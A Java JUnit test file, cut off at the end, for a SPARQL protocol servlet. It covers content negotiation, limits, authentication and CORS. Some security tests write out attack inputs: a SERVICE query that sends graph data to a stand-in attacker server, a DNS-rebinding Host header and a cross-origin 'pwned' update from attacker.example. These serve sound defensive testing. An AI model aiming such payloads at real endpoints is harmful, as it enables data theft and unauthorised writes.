package org.cqels.examples.sparql;

import org.cqels.engine.CQELSEngine;
import org.cqels.engine.DataStream;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.ServerConnector;
import org.eclipse.rdf4j.model.IRI;
import org.eclipse.rdf4j.model.ValueFactory;
import org.eclipse.rdf4j.model.impl.SimpleValueFactory;
import org.eclipse.rdf4j.repository.RepositoryConnection;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Protocol conformance against a real Jetty on port 0 and a real engine. Each scenario that
 * needs different options (token, update, limits) starts its own endpoint over its own engine,
 * so the shared one stays read-only and unauthenticated.
 */
class SparqlProtocolServletTest {

    static final ValueFactory VF = SimpleValueFactory.getInstance();
    static final String EX = "urn:ex:";
    static final HttpClient HTTP = HttpClient.newHttpClient();

    /** A started endpoint: engine, Jetty, base URL of the servlet. */
    record Endpoint(CQELSEngine engine, Server server, String url) implements AutoCloseable {
        static Endpoint start(EndpointOptions options, int seedTriples) throws Exception {
            CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
            try (RepositoryConnection c = engine.getRepository().getConnection()) {
                c.add(iri("EV-7Q2"), iri("depot"), iri("North"));
                c.add(iri("EV-3K8"), iri("depot"), iri("West"));
                c.add(iri("g1s"), iri("p"), iri("g1o"), iri("g1"));
                c.add(iri("g2s"), iri("p"), iri("g2o"), iri("g2"));
                for (int i = 0; i < seedTriples; i++) {
                    c.add(iri("bulk" + i), iri("v"), VF.createLiteral(i));
                }
            }
            engine.start();
            Server server = SparqlEndpointLauncher.startServer(engine, "127.0.0.1", 0, options, 64, false);
            int port = ((ServerConnector) server.getConnectors()[0]).getLocalPort();
            return new Endpoint(engine, server, "http://127.0.0.1:" + port + options.path());
        }

        @Override
        public void close() throws Exception {
            server.stop();
            engine.close();
        }
    }

    static Endpoint shared;

    @BeforeAll
    static void start() throws Exception {
        shared = Endpoint.start(EndpointOptions.defaults(), 0);
    }

    @AfterAll
    static void stop() throws Exception {
        shared.close();
    }

    static IRI iri(String local) {
        return VF.createIRI(EX + local);
    }

    static String enc(String s) {
        return URLEncoder.encode(s, StandardCharsets.UTF_8);
    }

    static HttpResponse<String> get(String url, String query, String accept) throws Exception {
        HttpRequest.Builder b = HttpRequest.newBuilder(URI.create(url + "?query=" + enc(query)));
        if (accept != null) {
            b.header("Accept", accept);
        }
        return HTTP.send(b.build(), HttpResponse.BodyHandlers.ofString());
    }

    static HttpResponse<String> post(String url, String contentType, String body, String accept, String... headers)
            throws Exception {
        HttpRequest.Builder b = HttpRequest.newBuilder(URI.create(url))
                .header("Content-Type", contentType)
                .POST(HttpRequest.BodyPublishers.ofString(body));
        if (accept != null) {
            b.header("Accept", accept);
        }
        for (int i = 0; i + 1 < headers.length; i += 2) {
            b.header(headers[i], headers[i + 1]);
        }
        return HTTP.send(b.build(), HttpResponse.BodyHandlers.ofString());
    }

    static String type(HttpResponse<?> r) {
        return r.headers().firstValue("Content-Type").orElse("");
    }

    // ---- the protocol matrix ---------------------------------------------------------------

    @Test
    void selectViaGetDefaultsToJson() throws Exception {
        var r = get(shared.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> <urn:ex:North> }", null);
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("application/sparql-results+json"), type(r));
        assertTrue(r.body().contains("urn:ex:EV-7Q2"), r.body());
        assertFalse(r.body().contains("EV-3K8"));
    }

    @Test
    void selectViaFormPostAsXml() throws Exception {
        var r = post(shared.url(), "application/x-www-form-urlencoded",
                "query=" + enc("SELECT ?v WHERE { ?v <urn:ex:depot> ?d }"), "application/sparql-results+xml");
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("application/sparql-results+xml"), type(r));
        assertTrue(r.body().contains("<sparql"), r.body());
    }

    @Test
    void selectViaDirectPostAsCsv() throws Exception {
        var r = post(shared.url(), "application/sparql-query",
                "SELECT ?v WHERE { ?v <urn:ex:depot> ?d } ORDER BY ?v", "text/csv");
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("text/csv"), type(r));
        assertTrue(r.body().startsWith("v"), r.body());
        assertTrue(r.body().contains("urn:ex:EV-3K8"));
    }

    @Test
    void askDefaultsToJson() throws Exception {
        var r = get(shared.url(), "ASK { <urn:ex:EV-7Q2> ?p ?o }", null);
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("application/sparql-results+json"));
        assertTrue(r.body().replace(" ", "").contains("\"boolean\":true"), r.body());
    }

    @Test
    void constructDefaultsToTurtle() throws Exception {
        var r = get(shared.url(), "CONSTRUCT WHERE { ?s <urn:ex:depot> ?o }", null);
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("text/turtle"), type(r));
        assertTrue(r.body().contains("<urn:ex:North>"), r.body());
    }

    @Test
    void describeAsNTriples() throws Exception {
        var r = get(shared.url(), "DESCRIBE <urn:ex:EV-7Q2>", "application/n-triples");
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("application/n-triples"), type(r));
        assertTrue(r.body().contains("<urn:ex:EV-7Q2> <urn:ex:depot> <urn:ex:North> ."), r.body());
    }

    @Test
    void acceptQualityOrderingIsHonoured() throws Exception {
        var r = get(shared.url(), "SELECT * WHERE { ?s ?p ?o }",
                "application/sparql-results+json;q=0.5, text/tab-separated-values;q=0.9");
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("text/tab-separated-values"), type(r));
    }

    @Test
    void datasetParameterRestrictsTheDefaultGraph() throws Exception {
        String q = "SELECT ?s WHERE { ?s <urn:ex:p> ?o }";
        var all = get(shared.url(), q, null);
        assertTrue(all.body().contains("g1s") && all.body().contains("g2s"), all.body());
        var r = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc(q)
                + "&default-graph-uri=" + enc("urn:ex:g1"))).build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(200, r.statusCode());
        assertTrue(r.body().contains("g1s"), r.body());
        assertFalse(r.body().contains("g2s"), r.body());
    }

    // ---- refusals ---------------------------------------------------------------------------

    @Test
    void malformedQueryIs400() throws Exception {
        var r = get(shared.url(), "SELEKT nonsense", null);
        assertEquals(400, r.statusCode());
        assertTrue(r.body().startsWith("malformed query"), r.body());
    }

    @Test
    void unmatchableAcceptIs406() throws Exception {
        var r = get(shared.url(), "SELECT * WHERE { ?s ?p ?o }", "application/vnd.nothing");
        assertEquals(406, r.statusCode());
    }

    @Test
    void unknownPostContentTypeIs415() throws Exception {
        var r = post(shared.url(), "text/plain", "SELECT * WHERE { ?s ?p ?o }", null);
        assertEquals(415, r.statusCode());
    }

    @Test
    void badGraphIriIs400() throws Exception {
        // the last two pass SimpleValueFactory's colon check and ParsedIRI.create; the strict parser refuses them
        for (String bad : List.of("not-an-iri", "http://bad iri", "1:invalid")) {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc("ASK {}")
                    + "&default-graph-uri=" + enc(bad))).build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(400, r.statusCode(), bad);
        }
    }

    @Test
    void malformedPercentEncodingIs400() throws Exception {
        var r = post(shared.url(), "application/x-www-form-urlencoded", "query=ASK%7B%7D&x=%zz", null);
        assertEquals(400, r.statusCode(), r.body());
        assertTrue(r.body().contains("percent-encoding"), r.body());
    }

    @Test
    void relativeIrisResolveAgainstTheRequestUrl() throws Exception {
        var r = get(shared.url(), "SELECT (<relative> AS ?x) WHERE {}", "text/csv");
        assertEquals(200, r.statusCode(), r.body());
        assertTrue(r.body().contains(shared.url().replace("/sparql", "/relative")), r.body());
    }

    @Test
    void updateIsForbiddenByDefaultAndNotAcceptedViaGet() throws Exception {
        var viaPost = post(shared.url(), "application/x-www-form-urlencoded",
                "update=" + enc("INSERT DATA { <urn:ex:x> <urn:ex:y> <urn:ex:z> }"), null);
        assertEquals(403, viaPost.statusCode());
        var direct = post(shared.url(), "application/sparql-update", "INSERT DATA { <urn:ex:x> <urn:ex:y> <urn:ex:z> }", null);
        assertEquals(403, direct.statusCode());
        var viaGet = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?update=" + enc("INSERT DATA {}")))
                .build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(405, viaGet.statusCode());
        var still = get(shared.url(), "ASK { <urn:ex:x> ?p ?o }", null);
        assertTrue(still.body().replace(" ", "").contains("\"boolean\":false"));
    }

    @Test
    void oversizedBodyIs413() throws Exception {
        try (Endpoint small = Endpoint.start(EndpointOptions.defaults().withMaxRequestBytes(64), 0)) {
            String big = "SELECT * WHERE { ?s ?p ?o } #" + "x".repeat(200);
            var direct = post(small.url(), "application/sparql-query", big, null);
            assertEquals(413, direct.statusCode());
            var form = post(small.url(), "application/x-www-form-urlencoded", "query=" + enc(big), null);
            assertEquals(413, form.statusCode());
            // Chunked: no Content-Length for the early check, so the bounded read must catch it —
            // for a form too, which the container would otherwise parse under its own limit.
            for (String type : List.of("application/x-www-form-urlencoded", "application/sparql-query")) {
                byte[] body = (type.endsWith("urlencoded") ? "query=" + enc(big) : big).getBytes(StandardCharsets.UTF_8);
                var chunked = HTTP.send(HttpRequest.newBuilder(URI.create(small.url()))
                        .header("Content-Type", type)
                        .POST(HttpRequest.BodyPublishers.ofInputStream(() -> new java.io.ByteArrayInputStream(body)))
                        .build(), HttpResponse.BodyHandlers.ofString());
                assertEquals(413, chunked.statusCode(), type);
            }
        }
    }

    // ---- outbound requests: SERVICE and LOAD ------------------------------------------------

    /** A stand-in for an attacker's SPARQL service: counts what it receives, answers an empty result. */
    static final class Remote implements AutoCloseable {
        final com.sun.net.httpserver.HttpServer server;
        final java.util.concurrent.atomic.AtomicInteger hits = new java.util.concurrent.atomic.AtomicInteger();
        final StringBuffer received = new StringBuffer();

        Remote() throws IOException {
            server = com.sun.net.httpserver.HttpServer.create(new java.net.InetSocketAddress("127.0.0.1", 0), 0);
            server.createContext("/", ex -> {
                hits.incrementAndGet();
                received.append(ex.getRequestURI()).append(' ')
                        .append(new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8));
                byte[] body = "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}".getBytes(StandardCharsets.UTF_8);
                ex.getResponseHeaders().add("Content-Type", "application/sparql-results+json");
                ex.sendResponseHeaders(200, body.length);
                ex.getResponseBody().write(body);
                ex.close();
            });
            server.start();
        }

        String url() {
            return "http://127.0.0.1:" + server.getAddress().getPort() + "/sparql";
        }

        @Override
        public void close() {
            server.stop(0);
        }
    }

    /**
     * The exfiltration found reviewing #105: SERVICE makes the server itself send bindings from
     * the graph to any URL, and a cross-site {@code <img>} GET carries no Origin to stop it.
     */
    @Test
    void serviceAndLoadAreRefusedUnlessFederationIsEnabled() throws Exception {
        try (Remote remote = new Remote();
             Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            String leak = "SELECT * WHERE { ?v <urn:ex:depot> ?d . SERVICE <" + remote.url() + "> { ?v ?p ?o } }";
            var q = get(rw.url(), leak, null);
            assertEquals(403, q.statusCode(), q.body());
            var u = post(rw.url(), "application/sparql-update",
                    "INSERT { ?v <urn:ex:seen> ?o } WHERE { ?v <urn:ex:depot> ?d . SERVICE <" + remote.url() + "> { ?v ?p ?o } }", null);
            assertEquals(403, u.statusCode(), u.body());
            var load = post(rw.url(), "application/sparql-update", "LOAD <" + remote.url() + "/data.ttl>", null);
            assertEquals(403, load.statusCode(), load.body());
            assertEquals(0, remote.hits.get(), "the endpoint sent a request out: " + remote.received);
        }
        // and the vector is real: with federation on, the bindings do leave
        try (Remote remote = new Remote();
             Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            var q = get(fed.url(), "SELECT * WHERE { ?v <urn:ex:depot> ?d . SERVICE <" + remote.url() + "> { ?v ?p ?o } }", null);
            assertEquals(200, q.statusCode(), q.body());
            assertTrue(remote.hits.get() > 0);
            assertTrue(remote.received.toString().contains("EV-7Q2"), remote.received.toString());
        }
    }

    @Test
    void crossSiteBrowserRequestsWithoutOriginAreRefused() throws Exception {
        String url = shared.url() + "?query=" + enc("ASK {}");
        for (String site : List.of("cross-site", "same-site")) {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(url)).header("Sec-Fetch-Site", site).build(),
                    HttpResponse.BodyHandlers.ofString());
            assertEquals(403, r.statusCode(), site);
        }
        for (String site : List.of("none", "same-origin")) {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(url)).header("Sec-Fetch-Site", site).build(),
                    HttpResponse.BodyHandlers.ofString());
            assertEquals(200, r.statusCode(), site);
        }
    }

    /** java.net.http refuses to set Host, so these requests go over a raw socket. Returns the status code. */
    static int statusWithHost(String url, String host) throws IOException {
        URI u = URI.create(url);
        try (java.net.Socket socket = new java.net.Socket(u.getHost(), u.getPort())) {
            socket.setSoTimeout(5000);
            String request = "GET " + u.getRawPath() + "?query=" + enc("ASK {}") + " HTTP/1.1\r\nHost: " + host
                    + "\r\nSec-Fetch-Site: same-origin\r\nConnection: close\r\n\r\n";
            socket.getOutputStream().write(request.getBytes(StandardCharsets.US_ASCII));
            String status = new java.io.BufferedReader(new java.io.InputStreamReader(socket.getInputStream(),
                    StandardCharsets.US_ASCII)).readLine();
            return Integer.parseInt(status.split(" ")[1]);
        }
    }

    /**
     * DNS rebinding, found reviewing #105: the attacker's page is same-origin to the browser
     * (no Origin, Sec-Fetch-Site: same-origin) — only the Host header still names its domain.
     */
    @Test
    void reboundHostIsRefusedWithoutAToken() throws Exception {
        int port = URI.create(shared.url()).getPort();
        assertEquals(403, statusWithHost(shared.url(), "rebind.attacker.example:" + port));
        for (String ok : List.of("127.0.0.1:" + port, "localhost:" + port, "LOCALHOST", "[::1]:" + port)) {
            assertEquals(200, statusWithHost(shared.url(), ok), ok);
        }
        // a token defeats rebinding by itself, so no host check unless one is asked for
        try (Endpoint locked = Endpoint.start(EndpointOptions.defaults().withAuthToken("s3cret"), 0)) {
            assertEquals(401, statusWithHost(locked.url(), "rebind.attacker.example"));
        }
        try (Endpoint named = Endpoint.start(EndpointOptions.defaults().withAllowedHosts(List.of("sparql.fleet.example")), 0)) {
            assertEquals(200, statusWithHost(named.url(), "sparql.fleet.example"));
            assertEquals(200, statusWithHost(named.url(), "localhost"));   // listed names add to the defaults
            assertEquals(403, statusWithHost(named.url(), "rebind.attacker.example"));
        }
        assertTrue(SparqlEndpointLauncher.allowedHosts("127.0.0.1",
                EndpointOptions.defaults().withAllowedHosts(List.of("*"))).isEmpty());
    }

    // ---- options that need their own endpoint ----------------------------------------------

    @Test
    void updateWhenEnabledIsVisibleToTheNextQuery() throws Exception {
        try (Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            var up = post(rw.url(), "application/sparql-update", "INSERT DATA { <urn:ex:x> <urn:ex:y> <urn:ex:z> }", null);
            assertEquals(204, up.statusCode());
            var ask = get(rw.url(), "ASK { <urn:ex:x> <urn:ex:y> <urn:ex:z> }", null);
            assertTrue(ask.body().replace(" ", "").contains("\"boolean\":true"), ask.body());
            var bad = post(rw.url(), "application/sparql-update", "INSERT GARBAGE", null);
            assertEquals(400, bad.statusCode());
        }
    }

    /** §2.2.3: protocol update datasets plus USING / WITH are an error — RDF4J would let WITH win. */
    @Test
    void updateDatasetParametersConflictingWithWithAre400() throws Exception {
        try (Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            for (String u : List.of("WITH <urn:ex:g1> DELETE { ?s ?p ?o } WHERE { ?s ?p ?o }",
                    "DELETE { GRAPH <urn:ex:g1> { ?s ?p ?o } } USING <urn:ex:g1> WHERE { ?s ?p ?o }")) {
                var r = post(rw.url() + "?using-graph-uri=" + enc("urn:ex:g2"), "application/sparql-update", u, null);
                assertEquals(400, r.statusCode(), u + " -> " + r.body());
            }
            var still = get(rw.url(), "ASK { GRAPH <urn:ex:g1> { <urn:ex:g1s> ?p ?o } }", null);
            assertTrue(still.body().replace(" ", "").contains("\"boolean\":true"), "the conflicting update ran");
            // without the conflict the parameter is applied
            var ok = post(rw.url() + "?using-graph-uri=" + enc("urn:ex:g2"), "application/sparql-update",
                    "DELETE { GRAPH <urn:ex:g2> { ?s ?p ?o } } WHERE { ?s ?p ?o }", null);
            assertEquals(204, ok.statusCode(), ok.body());
            var gone = get(rw.url(), "ASK { GRAPH <urn:ex:g2> { ?s ?p ?o } }", null);
            assertTrue(gone.body().replace(" ", "").contains("\"boolean\":false"), gone.body());
        }
    }

    /**
     * A cross-origin form POST is a CORS "simple" request: the browser sends it with no
     * preflight. Without the origin check any page could write to a loopback endpoint.
     */
    @Test
    void crossOriginFormUpdateIsRefused() throws Exception {
        try (Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            String form = "update=" + enc("INSERT DATA { <urn:ex:pwned> <urn:ex:y> <urn:ex:z> }");
            var r = post(rw.url(), "application/x-www-form-urlencoded", form, null, "Origin", "https://attacker.example");
            assertEquals(403, r.statusCode(), r.body());
            var ask = get(rw.url(), "ASK { <urn:ex:pwned> ?p ?o }", null);
            assertTrue(ask.body().replace(" ", "").contains("\"boolean\":false"), "the cross-origin update ran");
            assertEquals(204, post(rw.url(), "application/x-www-form-urlencoded", form, null).statusCode());
        }
    }

    @Test
    void bearerTokenIsEnforcedInConstantTimeShape() throws Exception {
        try (Endpoint locked = Endpoint.start(EndpointOptions.defaults().withAuthToken("s3cret"), 0)) {
            var none = get(locked.url(), "ASK {}", null);
            assertEquals(401, none.statusCode());
            assertEquals("Bearer", none.headers().firstValue("WWW-Authenticate").orElse(""));
            var wrong = post(locked.url(), "application/sparql-query", "ASK {}", null, "Authorization", "Bearer nope");
            assertEquals(401, wrong.statusCode());
            var right = post(locked.url(), "application/sparql-query", "ASK {}", null, "Authorization", "Bearer s3cret");
            assertEquals(200, right.statusCode());
            // health stays reachable for probes without the token
            var health = HTTP.send(HttpRequest.newBuilder(URI.create(locked.url().replace("/sparql", "/health"))).build(),
                    HttpResponse.BodyHandlers.ofString());
            assertEquals(200, health.statusCode());
        }
    }

    @Test
    void corsPreflightAnsweredForAllowedOriginOnly() throws Exception {
        try (Endpoint cors = Endpoint.start(EndpointOptions.defaults().withAllowedOrigins(List.of("https://yasgui.example")), 0)) {
            var ok = HTTP.send(HttpRequest.newBuilder(URI.create(cors.url()))
                    .method("OPTIONS", HttpRequest.BodyPublishers.noBody())
                    .header("Origin", "https://yasgui.example")
                    .header("Access-Control-Request-Method", "POST").build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(204, ok.statusCode());
            assertEquals("https://yasgui.example", ok.headers().firstValue("Access-Control-Allow-Origin").orElse(""));
            assertEquals(AccessFilters.Origins.EXPOSED, ok.headers().firstValue("Access-Control-Expose-Headers").orElse(""));
            var other = HTTP.send(HttpRequest.newBuilder(URI.create(cors.url() + "?query=" + enc("ASK {}")))
                    .header("Origin", "https://evil.example").build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(403, other.statusCode());
            assertTrue(other.headers().firstValue("Access-Control-Allow-Origin").isEmpty());
            // an error answered to an allowed origin keeps its CORS headers, so the browser can read it
            var malformed = HTTP.send(HttpRequest.newBuilder(URI.create(cors.url() + "?query=" + enc("SELEKT")))
                    .header("Origin", "https://yasgui.example").build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(400, malformed.statusCode());
            assertEquals("https://yasgui.example", malformed.headers().firstValue("Access-Control-Allow-Origin").orElse(""));
        }
    }

    @Test
    void maxRowsTruncatesAndSaysSo() throws Exception {
        try (Endpoint capped = Endpoint.start(EndpointOptions.defaults().withMaxRows(2), 10)) {
            var r = get(capped.url(), "SELECT ?s WHERE { ?s <urn:ex:v> ?x }", "text/csv");
            assertEquals(200, r.statusCode());
            assertEquals("true", r.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).orElse(""));
            assertEquals(3, r.body().strip().split("\n").length, r.body());   // header + 2 rows
            var few = get(capped.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> <urn:ex:North> }", "text/csv");
            assertTrue(few.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).isEmpty());
        }
    }

    /**
     * A shape RDF4J 4.3.8 does interrupt: the sort over a 4-way cross product of ~300 triples
     * stops ~1 s after a 1 s limit, before any row is written, so the status can still be set.
     * A {@code COUNT} over the same join is NOT interruptible (measured: not by the limit, not by
     * closing the connection, not by interrupting the thread) — do not use it here; that is what
     * the slot cap in the next test is for.
     */
    static final String SLOW_BUT_STOPPABLE =
            "SELECT ?a WHERE { ?a ?b ?c . ?d ?e ?f . ?g ?h ?i . ?j ?k ?l } ORDER BY ?a LIMIT 1";

    @Test
    void executionLimitAnswers503BeforeTheFirstRow() throws Exception {
        try (Endpoint slow = Endpoint.start(EndpointOptions.defaults().withMaxExecutionSeconds(1), 300)) {
            long t0 = System.nanoTime();
            var r = get(slow.url(), SLOW_BUT_STOPPABLE, null);
            assertEquals(503, r.statusCode(), r.body());
            assertTrue(r.body().contains("execution limit"), r.body());
            assertTrue((System.nanoTime() - t0) / 1e9 < 10, "limit took too long to trip");
        }
    }

    /**
     * The limit tripping after rows are already on the wire cannot become a 503 any more. The
     * response must then be aborted — a client must not receive a short result as a complete 200.
     */
    @Test
    void executionLimitAfterCommitAbortsTheResponse() throws Exception {
        try (Endpoint slow = Endpoint.start(EndpointOptions.defaults().withMaxExecutionSeconds(1), 300)) {
            long t0 = System.nanoTime();
            var req = HttpRequest.newBuilder(URI.create(slow.url() + "?query="
                    + enc("SELECT * WHERE { ?a ?b ?c . ?d ?e ?f . ?g ?h ?i . ?j ?k ?l }"))).header("Accept", "text/csv").build();
            assertThrows(IOException.class, () -> HTTP.send(req, HttpResponse.BodyHandlers.discarding()));
            assertTrue((System.nanoTime() - t0) / 1e9 < 20, "limit took too long to trip");
        }
    }

    /** RDF4J wraps an update's timeout twice (UpdateExecutionException → SailException → QueryInterruptedException). */
    @Test
    void updateExecutionLimitIs503() throws Exception {
        try (Endpoint slow = Endpoint.start(EndpointOptions.defaults().withMaxExecutionSeconds(1).withUpdateEnabled(true), 300)) {
            var r = post(slow.url(), "application/sparql-update",
                    "DELETE { ?a ?b ?c } WHERE { { SELECT ?a ?b ?c WHERE { ?a ?b ?c . ?d ?e ?f . ?g ?h ?i . ?j ?k ?l } ORDER BY ?a LIMIT 1 } }",
                    null);
            assertEquals(503, r.statusCode(), r.body());
            assertTrue(r.body().contains("execution limit"), r.body());
        }
    }

    /**
     * Holds the first {@code holds} requests inside their query slot — the servlet asks for the
     * repository only after acquiring one — until {@link #release} opens. No sleeps: the test
     * waits on {@link #entered} for the slots to be taken.
     */
    static final class SlotHolder implements java.util.function.Supplier<org.eclipse.rdf4j.repository.Repository> {
        final CQELSEngine engine;
        final java.util.concurrent.atomic.AtomicInteger holds;
        final java.util.concurrent.CountDownLatch entered;
        final java.util.concurrent.CountDownLatch release = new java.util.concurrent.CountDownLatch(1);

        SlotHolder(CQELSEngine engine, int holds) {
            this.engine = engine;
            this.holds = new java.util.concurrent.atomic.AtomicInteger(holds);
            this.entered = new java.util.concurrent.CountDownLatch(holds);
        }

        @Override
        public org.eclipse.rdf4j.repository.Repository get() {
            if (holds.getAndDecrement() > 0) {
                entered.countDown();
                try {
                    release.await();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
            return engine.getRepository();
        }
    }

    static HttpResponse<String> getWithin(String url, java.time.Duration timeout) throws Exception {
        return HTTP.send(HttpRequest.newBuilder(URI.create(url)).timeout(timeout).build(), HttpResponse.BodyHandlers.ofString());
    }

    @Test
    void concurrencyCapAnswers503WithRetryAfterAtOnce() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        SlotHolder holder = new SlotHolder(engine, 1);
        Server server = SparqlEndpointLauncher.startServer(holder, null, "127.0.0.1", 0,
                EndpointOptions.defaults().withMaxConcurrentQueries(1), 64, false);
        try {
            String url = "http://127.0.0.1:" + ((ServerConnector) server.getConnectors()[0]).getLocalPort() + "/sparql";
            String ask = url + "?query=" + enc("ASK {}");
            var holdsTheSlot = HTTP.sendAsync(HttpRequest.newBuilder(URI.create(ask)).build(), HttpResponse.BodyHandlers.ofString());
            assertTrue(holder.entered.await(10, java.util.concurrent.TimeUnit.SECONDS), "the first request never took the slot");
            var turnedAway = getWithin(ask, java.time.Duration.ofSeconds(5));
            assertEquals(503, turnedAway.statusCode(), turnedAway.body());
            assertEquals("1", turnedAway.headers().firstValue("Retry-After").orElse(""));
            assertTrue(turnedAway.body().contains("too many concurrent queries"), turnedAway.body());
            holder.release.countDown();
            assertEquals(200, holdsTheSlot.get(10, java.util.concurrent.TimeUnit.SECONDS).statusCode());
            assertEquals(200, getWithin(ask, java.time.Duration.ofSeconds(5)).statusCode());   // slot released
        } finally {
            holder.release.countDown();
            server.stop();
            engine.close();
        }
    }

    /** With every slot held and the smallest pool start-up accepts, rejections and /health still answer. */
    @Test
    void fullSlotsLeaveHealthAndRejectionReachableAtTheMinimumPool() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        int slots = 3;
        Server probe = SparqlEndpointLauncher.startServer(engine::getRepository, null, "127.0.0.1", 0,
                EndpointOptions.defaults().withMaxConcurrentQueries(slots), 64, false);
        int leased = ((org.eclipse.jetty.util.thread.QueuedThreadPool) probe.getThreadPool()).getThreadPoolBudget().getLeasedThreads();
        probe.stop();
        int minimum = Math.max(8, SparqlEndpointLauncher.minimumThreads(slots, leased));

        SlotHolder holder = new SlotHolder(engine, slots);
        Server server = SparqlEndpointLauncher.startServer(holder, null, "127.0.0.1", 0,
                EndpointOptions.defaults().withMaxConcurrentQueries(slots), minimum, false);
        try {
            String base = "http://127.0.0.1:" + ((ServerConnector) server.getConnectors()[0]).getLocalPort();
            String ask = base + "/sparql?query=" + enc("ASK {}");
            List<java.util.concurrent.CompletableFuture<HttpResponse<String>>> held = new java.util.ArrayList<>();
            for (int i = 0; i < slots; i++) {
                held.add(HTTP.sendAsync(HttpRequest.newBuilder(URI.create(ask)).build(), HttpResponse.BodyHandlers.ofString()));
            }
            assertTrue(holder.entered.await(10, java.util.concurrent.TimeUnit.SECONDS), "the slots were never all taken");
            assertEquals(200, getWithin(base + "/health", java.time.Duration.ofSeconds(2)).statusCode());
            assertEquals(503, getWithin(ask, java.time.Duration.ofSeconds(2)).statusCode());
            holder.release.countDown();
            for (var f : held) {
                assertEquals(200, f.get(10, java.util.concurrent.TimeUnit.SECONDS).statusCode());
            }
        } finally {
            holder.release.countDown();
            server.stop();
            engine.close();
        }
    }

    @Test
    void fewerThreadsThanSlotsIsRefusedAtStartUp() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        try {
            var e = assertThrows(IllegalStateException.class, () -> SparqlEndpointLauncher.startServer(engine,
                    "127.0.0.1", 0, EndpointOptions.defaults().withMaxConcurrentQueries(16), 8, false));
            assertTrue(e.getMessage().contains("CQELS_SPARQL_MAX_THREADS"), e.getMessage());
        } finally {
            engine.close();
        }
    }

    // ---- the bridge to continuous queries ---------------------------------------------------

    @Test
    void continuousResultsWrittenBackAreQueryable() throws Exception {
        try (Endpoint e = Endpoint.start(EndpointOptions.defaults(), 0)) {
            CQELSEngine engine = e.engine();
            DataStream telemetry = engine.createStream("Telemetry");
            engine.registerCqelsQuery("""
                    REGISTER QUERY Fast AS
                    SELECT ?v ?kmh FROM STREAM Telemetry [NOW]
                    WHERE { STREAM Telemetry { ?v <urn:ex:speed> ?kmh } FILTER(?kmh > 120) }
                    """, row -> {
                try (RepositoryConnection c = engine.getRepository().getConnection()) {
                    c.add(VF.createIRI("urn:ex:alert:" + row.get("kmh")), iri("vehicle"),
                            VF.createIRI(String.valueOf(row.get("v"))));
                }
            });
            telemetry.push(VF.createStatement(iri("EV-7Q2"), iri("speed"), VF.createLiteral(135)));
            telemetry.push(VF.createStatement(iri("EV-3K8"), iri("speed"), VF.createLiteral(90)));
            boolean seen = false;
            for (int i = 0; i < 50 && !seen; i++) {
                Thread.sleep(100);
                var r = get(e.url(), "ASK { <urn:ex:alert:135> <urn:ex:vehicle> <urn:ex:EV-7Q2> }", null);
                seen = r.body().replace(" ", "").contains("\"boolean\":true");
            }
            assertTrue(seen, "the continuous query's written-back row never became visible");
            var none = get(e.url(), "ASK { ?a <urn:ex:vehicle> <urn:ex:EV-3K8> }", null);
            assertTrue(none.body().replace(" ", "").contains("\"boolean\":false"));
        }
    }

    // ---- the metadata graph -----------------------------------------------------------------

    static final String META = "cqels://endpoint/metadata";
    static final String CQE = "PREFIX cqe: <cqels://ontology/endpoint#> ";

    static Endpoint withMetadata() throws Exception {
        return Endpoint.start(EndpointOptions.defaults().withMetadataEnabled(true).withUpdateEnabled(true), 0);
    }

    static String csv(String url, String query) throws Exception {
        var r = get(url, query, "text/csv");
        assertEquals(200, r.statusCode(), r.body());
        return r.body();
    }

    static boolean ask(String url, String query) throws Exception {
        var r = get(url, query, null);
        assertEquals(200, r.statusCode(), r.body());
        return r.body().replace(" ", "").contains("\"boolean\":true");
    }

    @Test
